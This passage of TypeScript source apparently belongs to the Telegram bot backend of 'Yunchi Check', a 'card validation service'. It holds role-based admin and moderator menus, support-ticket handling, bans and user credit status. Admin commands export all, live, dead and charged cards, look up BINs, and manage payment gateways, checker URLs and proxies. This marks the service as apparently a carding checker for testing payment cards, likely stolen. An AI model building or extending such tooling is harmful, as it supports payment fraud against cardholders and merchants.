<i>Copy this ID to link your account</i>
`}

<b>🚀 Features</b>
├ ⚡ Fast card validation
├ 🔔 Instant notifications  
├ 📊 Real-time balance alerts
├ 🎫 24/7 Support system
└ 💳 Multiple payment methods

${isAdminUser ? `
🔐 <b>Admin Access Detected</b>
Use /admincmd for control panel
` : isModUser ? `
🛡️ <b>Moderator Access Detected</b>
Use /admincmd for staff panel
` : ""}
━━━━━━━━━━━━━━━━━━━━━━
`;

        const keyboard = {
          inline_keyboard: profile ? [
            [
              { text: "📊 My Status", callback_data: "user_mystatus" },
              { text: "💰 Balance", callback_data: "user_balance" }
            ],
            [
              { text: "❓ Help", callback_data: "user_help" },
              { text: "🌐 Open Dashboard", url: "https://yunchicheck.com/dashboard" }
            ]
          ] : [
            [
              { text: "📋 Copy Chat ID", callback_data: "user_copy_id" },
              { text: "❓ How to Connect", callback_data: "user_help" }
            ],
            [
              { text: "🌐 Sign Up Now", url: "https://yunchicheck.com/auth" }
            ]
          ]
        };

        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, welcomeMessage, keyboard);
        } else {
          await sendTelegramMessage(callbackChatId!, welcomeMessage, keyboard);
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // MENU QUICK ACTION CALLBACKS
      // ─────────────────────────────────────────────────────────

      if (callbackData === "menu_stats" || callbackData === "stats_refresh") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleStats(callbackChatId!, supabase, messageId);
        await answerCallbackQuery(update.callback_query.id, "📊 Stats refreshed");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_topups") {
        const hasAccess = await isAdminAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        const { message, keyboard } = await handleTopups(callbackChatId!, supabase, 0);
        if (message) {
          if (messageId) {
            await editTelegramMessage(callbackChatId!, messageId, message, keyboard || undefined);
          } else {
            await sendTelegramMessage(callbackChatId!, message, keyboard || undefined);
          }
        }
        await answerCallbackQuery(update.callback_query.id, "💰 Topups loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_allusers") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const perPage = 5;
        const { data: users, count } = await supabase
          .from("profiles")
          .select("user_id, username, credits, telegram_chat_id, is_banned", { count: "exact" })
          .order("created_at", { ascending: false });

        const { data: authData } = await supabase.auth.admin.listUsers();
        const usersWithEmail = users?.map((u: any) => ({
          ...u,
          email: authData?.users?.find((a: any) => a.id === u.user_id)?.email || null
        })) || [];

        const { message, keyboard } = buildUsersListMessage(
          usersWithEmail, 0, count || 0,
          usersWithEmail.filter((u: any) => u.telegram_chat_id).length,
          usersWithEmail.filter((u: any) => u.is_banned).length,
          perPage
        );

        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, message, keyboard || undefined);
        } else {
          await sendTelegramMessage(callbackChatId!, message, keyboard || undefined);
        }
        await answerCallbackQuery(update.callback_query.id, "👥 Users loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_tickets") {
        const hasAccess = await isAdminAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const { data: tickets } = await supabase
          .from("support_tickets")
          .select("ticket_id, subject, status, priority, created_at")
          .in("status", ["open", "processing"])
          .order("created_at", { ascending: false })
          .limit(10);

        const statusEmoji: Record<string, string> = { open: "🟡", processing: "🔵", solved: "🟢", closed: "⚫" };
        
        let ticketsList = "";
        if (tickets && tickets.length > 0) {
          tickets.forEach((t: any, i: number) => {
            ticketsList += `
${i + 1}. ${statusEmoji[t.status] || "⚪"} <b>${t.ticket_id}</b>
   ${t.subject.substring(0, 30)}${t.subject.length > 30 ? "..." : ""}
`;
          });
        } else {
          ticketsList = "\n✅ No open tickets!";
        }

        const ticketsMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      🎫 <b>SUPPORT TICKETS</b>
━━━━━━━━━━━━━━━━━━━━━━
${ticketsList}

<i>Use /ticket [id] to manage</i>
━━━━━━━━━━━━━━━━━━━━━━
`;

        const ticketsKeyboard = {
          inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "menu_back" }]]
        };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, ticketsMessage, ticketsKeyboard);
        } else {
          await sendTelegramMessage(callbackChatId!, ticketsMessage, ticketsKeyboard);
        }
        await answerCallbackQuery(update.callback_query.id, "🎫 Tickets loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_viewbans") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleViewBans(callbackChatId!, supabase);
        await answerCallbackQuery(update.callback_query.id, "🚫 Bans loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_admins") {
        const hasAccess = await isAdminAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleListAdmins(callbackChatId!, supabase);
        await answerCallbackQuery(update.callback_query.id, "👮 Staff loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_admincmd") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleAdminCmd(callbackChatId!, supabase);
        await answerCallbackQuery(update.callback_query.id, "🔐 Panel loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // ─────────────────────────────────────────────────────────
      // MODERATOR PANEL QUICK ACTION CALLBACKS
      // ─────────────────────────────────────────────────────────

      if (callbackData === "mod_addfund") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        const helpMsg = `
💰 <b>Add Fund</b>

<b>Usage:</b> /addfund <code>[email] [amount]</code>

<b>Example:</b>
<code>/addfund user@email.com 50</code>

⚠️ <i>Moderators can only add credits (positive amounts).</i>
`;
        const kb = { inline_keyboard: [[{ text: "🔙 Back to Panel", callback_data: "menu_admincmd" }]] };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, helpMsg, kb);
        } else {
          await sendTelegramMessage(callbackChatId!, helpMsg, kb);
        }
        await answerCallbackQuery(update.callback_query.id, "💰 Add Fund");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "mod_tickets") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const { data: tickets } = await supabase
          .from("support_tickets")
          .select("ticket_id, subject, status, priority, created_at")
          .in("status", ["open", "processing"])
          .order("created_at", { ascending: false })
          .limit(10);

        const statusEmoji: Record<string, string> = { open: "🟡", processing: "🔵", solved: "🟢", closed: "⚫" };
        let ticketsList = "";
        if (tickets && tickets.length > 0) {
          tickets.forEach((t: any, i: number) => {
            ticketsList += `\n${i + 1}. ${statusEmoji[t.status] || "⚪"} <b>${t.ticket_id}</b>\n   ${t.subject.substring(0, 30)}${t.subject.length > 30 ? "..." : ""}`;
          });
        } else {
          ticketsList = "\n✅ No open tickets!";
        }

        const ticketsMsg = `
━━━━━━━━━━━━━━━━━━━━━━
      🎫 <b>SUPPORT TICKETS</b>
━━━━━━━━━━━━━━━━━━━━━━
${ticketsList}

<i>Use /ticket [id] to manage</i>
━━━━━━━━━━━━━━━━━━━━━━
`;
        const kb = { inline_keyboard: [[{ text: "🔙 Back to Panel", callback_data: "menu_admincmd" }]] };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, ticketsMsg, kb);
        } else {
          await sendTelegramMessage(callbackChatId!, ticketsMsg, kb);
        }
        await answerCallbackQuery(update.callback_query.id, "📋 Tickets loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "mod_stats") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleStats(callbackChatId!, supabase, messageId);
        await answerCallbackQuery(update.callback_query.id, "📊 Stats loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "mod_allusers") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const perPage = 5;
        const { data: users, count } = await supabase
          .from("profiles")
          .select("user_id, username, credits, telegram_chat_id, is_banned", { count: "exact" })
          .order("created_at", { ascending: false });

        const { data: authData } = await supabase.auth.admin.listUsers();
        const usersWithEmail = users?.map((u: any) => ({
          ...u,
          email: authData?.users?.find((a: any) => a.id === u.user_id)?.email || null
        })) || [];

        const { message, keyboard } = buildUsersListMessage(
          usersWithEmail, 0, count || 0,
          usersWithEmail.filter((u: any) => u.telegram_chat_id).length,
          usersWithEmail.filter((u: any) => u.is_banned).length,
          perPage
        );

        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, message, keyboard || undefined);
        } else {
          await sendTelegramMessage(callbackChatId!, message, keyboard || undefined);
        }
        await answerCallbackQuery(update.callback_query.id, "👥 Users loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "mod_userinfo") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        const helpMsg = `
🔍 <b>User Info</b>

<b>Usage:</b> /userinfo <code>[username]</code>

<b>Example:</b>
<code>/userinfo john123</code>

<i>View detailed user information (read-only for moderators).</i>
`;
        const kb = { inline_keyboard: [[{ text: "🔙 Back to Panel", callback_data: "menu_admincmd" }]] };
        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, helpMsg, kb);
        } else {
          await sendTelegramMessage(callbackChatId!, helpMsg, kb);
        }
        await answerCallbackQuery(update.callback_query.id, "🔍 User Info");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "mod_viewbans") {
        const hasAccess = await isStaffAsync(callbackChatId!, supabase);
        if (!hasAccess) {
          await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
        await handleViewBans(callbackChatId!, supabase);
        await answerCallbackQuery(update.callback_query.id, "🚫 Bans loaded");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (callbackData === "menu_back") {
        // Rebuild menu
        const isAdminUser = await isAdminAsync(callbackChatId!, supabase);
        const isModUser = await isModeratorAsync(callbackChatId!, supabase);
        
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, credits, is_banned")
          .eq("telegram_chat_id", callbackChatId)
          .maybeSingle();

        let menuMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      📱 <b>MAIN MENU</b>
━━━━━━━━━━━━━━━━━━━━━━

${profile ? `👤 ${profile.username || "User"} | 💰 ${profile.credits || 0} credits` : "⚠️ Account not connected"}

Use /menu for full command list
━━━━━━━━━━━━━━━━━━━━━━
`;

        let keyboard: any;
        if (isAdminUser) {
          keyboard = {
            inline_keyboard: [
              [
                { text: "📊 Stats", callback_data: "menu_stats" },
                { text: "💰 Topups", callback_data: "menu_topups" },
                { text: "👥 Users", callback_data: "menu_allusers" }
              ],
              [
                { text: "🎫 Support", callback_data: "menu_tickets" },
                { text: "🚫 Bans", callback_data: "menu_viewbans" },
                { text: "👮 Staff", callback_data: "menu_admins" }
              ]
            ]
          };
        } else if (isModUser) {
          keyboard = {
            inline_keyboard: [
              [
                { text: "💰 Add Fund", callback_data: "mod_addfund" },
                { text: "📋 Tickets", callback_data: "mod_tickets" }
              ],
              [
                { text: "📊 Stats", callback_data: "mod_stats" },
                { text: "👥 Users", callback_data: "mod_allusers" }
              ],
              [
                { text: "🔍 User Info", callback_data: "mod_userinfo" },
                { text: "🚫 Bans", callback_data: "mod_viewbans" }
              ],
              [
                { text: "🛡️ Mod Panel", callback_data: "menu_admincmd" }
              ]
            ]
          };
        } else {
          keyboard = {
            inline_keyboard: [
              [
                { text: "📊 My Status", callback_data: "user_mystatus" },
                { text: "💰 Balance", callback_data: "user_balance" }
              ]
            ]
          };
        }

        if (messageId) {
          await editTelegramMessage(callbackChatId!, messageId, menuMessage, keyboard);
        } else {
          await sendTelegramMessage(callbackChatId!, menuMessage, keyboard);
        }
        await answerCallbackQuery(update.callback_query.id, "");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Ticket status (admin only)
      if (!callbackChatId || callbackChatId !== ADMIN_CHAT_ID) {
        await answerCallbackQuery(update.callback_query.id, "❌ Access denied");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const [action, ticketUuid] = callbackData.split("_");
      const statusMap: Record<string, string> = { open: "open", processing: "processing", solved: "solved", closed: "closed" };
      const newStatus = statusMap[action];

      if (newStatus && ticketUuid) {
        // Get old status before updating
        const { data: oldTicketData } = await supabase
          .from("support_tickets")
          .select("status")
          .eq("id", ticketUuid)
          .single();

        const oldStatus = oldTicketData?.status || null;

        const { data: ticket } = await supabase
          .from("support_tickets")
          .update({ status: newStatus, updated_at: new Date().toISOString() })
          .eq("id", ticketUuid)
          .select("ticket_id, subject, user_id")
          .single();

        if (ticket) {
          await answerCallbackQuery(update.callback_query.id, `✅ ${newStatus.toUpperCase()}`);
          if (update.callback_query.message) {
            await editMessageReplyMarkup(update.callback_query.message.chat.id, update.callback_query.message.message_id, ticketUuid, newStatus);
          }

          const { data: profile } = await supabase.from("profiles").select("telegram_chat_id").eq("user_id", ticket.user_id).maybeSingle();
          if (profile?.telegram_chat_id) {
            await sendTelegramMessage(profile.telegram_chat_id, `🎫 Ticket ${ticket.ticket_id} is now <b>${newStatus.toUpperCase()}</b>`);
          }

          // Send email notification for ticket status change
          try {
            await fetch(`${SUPABASE_URL}/functions/v1/notify-ticket-status`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
              },
              body: JSON.stringify({
                ticket_uuid: ticketUuid,
                new_status: newStatus,
                old_status: oldStatus
              }),
            });
          } catch (err) {
            console.error("Error calling notify-ticket-status:", err);
          }
        }
      }

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // TEXT MESSAGE: Reply to ticket
    // ─────────────────────────────────────────────────────────

    if (update.message?.text && update.message.reply_to_message && !update.message.text.startsWith("/")) {
      const chatId = update.message.chat.id.toString();
      const replyText = update.message.text;
      const originalMessage = update.message.reply_to_message.text || "";

      if (chatId !== ADMIN_CHAT_ID) {
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check for pending ban
      const { data: pendingBan } = await supabase.from("pending_bans").select("*").eq("admin_chat_id", chatId).maybeSingle();

      if (pendingBan && pendingBan.step === "reason") {
        await supabase.from("pending_bans").update({ ban_reason: replyText, step: "duration" }).eq("admin_chat_id", chatId);

        const keyboard = {
          inline_keyboard: [
            [
              { text: "1 hour", callback_data: "ban_duration_1" },
              { text: "24 hours", callback_data: "ban_duration_24" },
            ],
            [
              { text: "7 days", callback_data: "ban_duration_168" },
              { text: "30 days", callback_data: "ban_duration_720" },
            ],
            [{ text: "Permanent", callback_data: "ban_duration_permanent" }],
          ],
        };

        await sendTelegramMessage(chatId, `📝 Reason: ${replyText}\n\nSelect ban duration:`, keyboard);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Ticket reply
      const uuidMatch = originalMessage.match(/\[([a-f0-9-]{36})\]/i);
      if (!uuidMatch) {
        await sendTelegramMessage(chatId, "❌ Could not find ticket ID");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const ticketUuid = uuidMatch[1];
      const { data: ticket } = await supabase
        .from("support_tickets")
        .select("id, ticket_id, subject, user_id, user_email, status")
        .eq("id", ticketUuid)
        .single();

      if (!ticket) {
        await sendTelegramMessage(chatId, "❌ Ticket not found");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (ticket.status === "closed") {
        await sendTelegramMessage(chatId, "❌ Ticket is closed");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      await supabase.from("ticket_messages").insert({
        ticket_id: ticket.id,
        user_id: ticket.user_id,
        message: replyText,
        is_admin: true,
      });

      if (ticket.status === "open") {
        await supabase.from("support_tickets").update({ status: "processing" }).eq("id", ticket.id);
      }

      await sendEmailNotification(ticket.user_email, ticket.ticket_id, ticket.subject, replyText, "Support Team");

      const { data: profile } = await supabase.from("profiles").select("telegram_chat_id").eq("user_id", ticket.user_id).maybeSingle();
      if (profile?.telegram_chat_id) {
        await sendUserTelegramNotification(profile.telegram_chat_id, ticket.ticket_id, ticket.subject, replyText, "Support Team");
      }

      await sendTelegramMessage(chatId, `✅ Replied to ${ticket.ticket_id}`);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // COMMANDS
    // ─────────────────────────────────────────────────────────

    const text = update.message?.text || update.message?.caption || "";
    const chatId = update.message?.chat.id.toString() || "";
    const messageId = update.message?.message_id; // For reply-based responses

    // /start - Professional Welcome Page
    if (text === "/start") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      const isModUser = await isModeratorAsync(chatId, supabase);
      
      // Check if user is connected
      const { data: profile } = await supabase
        .from("profiles")
        .select("username, credits, is_banned")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      const welcomeMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      🎴 <b>YUNCHI CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━

<i>Premium Card Validation Service</i>

${profile ? `
✅ <b>Account Connected</b>
┌─────────────────────
│ 👤 ${profile.username || "User"}
│ 💰 ${profile.credits || 0} Credits
│ ${profile.is_banned ? "🚫 Status: Banned" : "✨ Status: Active"}
└─────────────────────
` : `
📋 <b>Your Chat ID</b>
┌─────────────────────
│ <code>${chatId}</code>
└─────────────────────

<i>Copy this ID to link your account</i>
`}

<b>🚀 Features</b>
├ ⚡ Fast card validation
├ 🔔 Instant notifications  
├ 📊 Real-time balance alerts
├ 🎫 24/7 Support system
└ 💳 Multiple payment methods

${isAdminUser ? `
🔐 <b>Admin Access Detected</b>
Use /admincmd for control panel
` : isModUser ? `
🛡️ <b>Moderator Access Detected</b>
Use /admincmd for staff panel
` : ""}
━━━━━━━━━━━━━━━━━━━━━━
`;

      const keyboard = {
        inline_keyboard: profile ? [
          [
            { text: "📊 My Status", callback_data: "user_mystatus" },
            { text: "💰 Balance", callback_data: "user_balance" }
          ],
          [
            { text: "❓ Help", callback_data: "user_help" },
            { text: "🌐 Open Dashboard", url: "https://yunchicheck.com/dashboard" }
          ]
        ] : [
          [
            { text: "📋 Copy Chat ID", callback_data: "user_copy_id" },
            { text: "❓ How to Connect", callback_data: "user_help" }
          ],
          [
            { text: "🌐 Sign Up Now", url: "https://yunchicheck.com/auth" }
          ]
        ]
      };

      await sendTelegramMessage(chatId, welcomeMessage, keyboard, messageId);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /menu - Full Navigation Menu
    if (text === "/menu") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      const isModUser = await isModeratorAsync(chatId, supabase);
      
      // Check if user is connected
      const { data: profile } = await supabase
        .from("profiles")
        .select("username, credits, is_banned")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      let menuMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      📱 <b>MAIN MENU</b>
━━━━━━━━━━━━━━━━━━━━━━
`;

      if (profile) {
        menuMessage += `
<b>👤 Account</b>
┌─────────────────────
│ ${profile.username || "User"} | ${profile.credits || 0} credits
│ ${profile.is_banned ? "🚫 Banned" : "✨ Active"}
└─────────────────────
`;
      } else {
        menuMessage += `
<b>⚠️ Not Connected</b>
┌─────────────────────
│ Link your account to access
│ all features
└─────────────────────
`;
      }

      menuMessage += `
<b>📋 User Commands</b>
┌─────────────────────
│ /start - Welcome page
│ /menu - This menu
│ /mystatus - Account details
│ /help - Help & guide
└─────────────────────
`;

      if (isModUser && !isAdminUser) {
        menuMessage += `
<b>🛡️ Moderator Commands</b>
┌─────────────────────
│ /admincmd - Staff panel
│ /ticket [id] - View ticket
│ /userinfo [user] - User details
│ /allusers - List users
│ /viewbans - Banned users
│ /stats - Statistics
└─────────────────────
`;
      }

      if (isAdminUser) {
        menuMessage += `
<b>🔐 Admin Commands</b>
┌─────────────────────
│ /admincmd - Admin panel
│ /ticket [id] - Manage ticket
│ /topups - Pending topups
│ /topup [user] - User topup
│ /addfund [email] [amt]
└─────────────────────

<b>👥 User Management</b>
┌─────────────────────
│ /userinfo [user]
│ /allusers - List all
│ /banuser [user]
│ /unbanuser [user]
│ /deleteuser [user]
│ /viewbans - Banned list
└─────────────────────

<b>📁 Card Data</b>
┌─────────────────────
│ /cardstats - Real-time stats
│ /allcards - Export all cards
│ /livecards - Export live cards
│ /deadcards - Export dead cards
│ /chargedcards - Charged cards
│ /bincard [bin] - By BIN
└─────────────────────

<b>🚫 Device Blocking</b>
┌─────────────────────
│ /viewblocked - Blocked list
│ /blockdevice [type] [val]
│ /unblockdevice [id]
│ /userdevices [user]
└─────────────────────

<b>🌐 Gateways</b>
┌─────────────────────
│ /gate - Status control
│ /addgate - Add gateway
│ /editgate [id] - Edit
│ /delgate [id] - Delete
│ /healthsites - Health check
│ /addurl - Add URLs
│ /clearurls - Clear URLs
│ /urlcount - URL count
│ /addproxy - Add proxy
│ /proxies - View proxies
│ /delproxy - Delete proxy
└─────────────────────

<b>📢 Communication</b>
┌─────────────────────
│ /broadcast [msg]
│ /stats - Statistics
│ /rejectall - Reject topups
└─────────────────────
`;

        if (isSuperAdmin(chatId)) {
          menuMessage += `
<b>👮 Role Management</b>
┌─────────────────────
│ /grantadmin [chat_id]
│ /revokeadmin [chat_id]
│ /promote [chat_id]
│ /demote [chat_id]
│ /admins - Staff list
└─────────────────────
`;
        }
      }

      menuMessage += `
━━━━━━━━━━━━━━━━━━━━━━
`;

      // Build keyboard based on role
      let keyboard: any;
      
      if (isAdminUser) {
        keyboard = {
          inline_keyboard: [
            [
              { text: "📊 Stats", callback_data: "menu_stats" },
              { text: "💰 Topups", callback_data: "menu_topups" },
              { text: "👥 Users", callback_data: "menu_allusers" }
            ],
            [
              { text: "🎫 Support", callback_data: "menu_tickets" },
              { text: "🚫 Bans", callback_data: "menu_viewbans" },
              { text: "👮 Staff", callback_data: "menu_admins" }
            ],
            [
              { text: "🔐 Admin Panel", callback_data: "menu_admincmd" }
            ]
          ]
        };
      } else if (isModUser) {
        keyboard = {
          inline_keyboard: [
            [
              { text: "📊 Stats", callback_data: "menu_stats" },
              { text: "👥 Users", callback_data: "menu_allusers" }
            ],
            [
              { text: "🚫 Bans", callback_data: "menu_viewbans" },
              { text: "🛡️ Staff Panel", callback_data: "menu_admincmd" }
            ]
          ]
        };
      } else if (profile) {
        keyboard = {
          inline_keyboard: [
            [
              { text: "📊 My Status", callback_data: "user_mystatus" },
              { text: "💰 Balance", callback_data: "user_balance" }
            ],
            [
              { text: "❓ Help", callback_data: "user_help" },
              { text: "🎫 Support", url: "https://yunchicheck.com/dashboard/support" }
            ],
            [
              { text: "🌐 Dashboard", url: "https://yunchicheck.com/dashboard" }
            ]
          ]
        };
      } else {
        keyboard = {
          inline_keyboard: [
            [
              { text: "📋 Copy Chat ID", callback_data: "user_copy_id" },
              { text: "❓ How to Connect", callback_data: "user_help" }
            ],
            [
              { text: "🌐 Sign Up", url: "https://yunchicheck.com/auth" }
            ]
          ]
        };
      }

      await sendTelegramMessage(chatId, menuMessage, keyboard, messageId);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /help
    if (text === "/help") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      const isModUser = await isModeratorAsync(chatId, supabase);
      let msg = `
📚 <b>Help</b>

<b>Connect Account:</b>
1. Copy Chat ID: <code>${chatId}</code>
2. Sign up at yunchicheck.com
3. Paste Chat ID
4. Verify when prompted

<b>Features:</b>
• Account verification
• Ticket notifications
• Support replies
• Announcements
• Balance alerts

<b>Commands:</b>
/start - Get Chat ID
/help - This message
/mystatus - Account status
/bin [prefix] - BIN lookup`;

      if (isModUser && !isAdminUser) {
        msg += `

<b>🛡️ Moderator Commands:</b>
/admincmd - Moderator panel
/ticket [id] - View &amp; reply to tickets
/addfund [email] [amount] - Add credits
/stats - View statistics
/allusers - Browse all users
/userinfo [user] - User details (read-only)
/viewbans - View banned users`;
      }

      if (isAdminUser) {
        msg += `

<b>🔐 Admin Commands:</b>
/admincmd - Admin panel
/ticket [id] - Manage ticket
/topups - Pending topups
/topup [user] - User topup
/rejectall - Reject all topups
/addfund [email] [amount]
/banuser /unbanuser /deleteuser
/viewbans /viewblocked
/blockdevice /unblockdevice
/userdevices [user]
/broadcast [msg]
/stats /cardstats
/allusers /userinfo [user]
/allcards /livecards /deadcards
/chargedcards /bincard [bin]
/gate /addgate /editgate /delgate
/healthsites /addurl /clearurls /urlcount
/addproxy /proxies /delproxy
/grantadmin /revokeadmin /admins
/promote /demote`;
      }

      await sendTelegramMessage(chatId, msg, undefined, messageId);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /mystatus
    if (text === "/mystatus") {
      const { data: profile } = await supabase
        .from("profiles")
        .select("user_id, username, name, credits, is_banned, ban_reason, banned_until, telegram_username, created_at")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      if (!profile) {
        await sendTelegramMessage(chatId, `
❌ <b>Not Connected</b>

Your Telegram is not linked.

<b>To connect:</b>
1. Copy: <code>${chatId}</code>
2. Sign up at yunchicheck.com
3. Paste Chat ID
`, undefined, messageId);
      } else {
        // Fetch card check stats
        const { count: totalChecks } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id);
        const { count: liveCards } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "live");
        const { count: deadCards } = await supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "dead");
        const successRate = (totalChecks || 0) > 0 ? (((liveCards || 0) / (totalChecks || 1)) * 100).toFixed(1) : "0.0";

        let status = "✅ Active";
        if (profile.is_banned) {
          status = profile.banned_until 
            ? `🚫 Banned until ${new Date(profile.banned_until).toLocaleDateString()}`
            : "🚫 Permanently Banned";
        }

        const joined = new Date(profile.created_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" });

        await sendTelegramMessage(chatId, `
👤 <b>My Status</b>

<b>Profile</b>
• Username: ${profile.username || "Not set"}
• Name: ${profile.name || "Not set"}

<b>Account</b>
• Credits: ${profile.credits || 0}
• Status: ${status}
• Joined: ${joined}
